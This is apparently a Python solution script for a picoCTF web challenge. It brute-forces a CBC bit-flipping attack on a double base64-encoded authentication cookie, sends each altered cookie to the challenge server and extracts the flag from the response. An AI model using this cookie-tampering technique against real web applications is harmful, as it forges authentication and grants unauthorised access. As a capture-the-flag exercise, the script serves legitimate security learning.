import requests
from base64 import b64decode, b64encode
from tqdm import tqdm

# Bit flip code based on https://crypto.stackexchange.com/a/66086.
def bit_flip(pos, bit, data):
    raw = b64decode(b64decode(data))
    list1 = bytearray(raw)
    list1[pos] = list1[pos] ^ (1 << bit)  # Flipping the appropriate bit using a mask
    raw = bytes(list1)
    return b64encode(b64encode(raw)).decode()

cookie = "dnRqL1ZPQWJwajJRcDJvRVQ1UjdKc0tDZUpsemtJbzJGVHF5MC9uSWJyN01vcWJubzdyM0F2WGxXeGRZMkVaYXFydWgrQkE3emVSY2NPamhid3lJQkJtVkRQWHg5cjR2YjVpQ0VzUnF6TzNHNnc3VlNwbUtGV2xicDZaeElOZWE="

for position_idx in tqdm(range(len(b64decode(b64decode(cookie)))), desc="Bruteforcing Position"):
    for bit_idx in tqdm(range(8), desc="Bruteforcing Bit"):
        auth_cookie = bit_flip(position_idx, bit_idx, cookie)
        cookies = {'auth_name': auth_cookie}
        r = requests.get('http://mercury.picoctf.net:34962/', cookies=cookies)
        if "picoCTF{" in r.text:
            # The flag is between `<code>` and `</code>`
            print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
            exit()
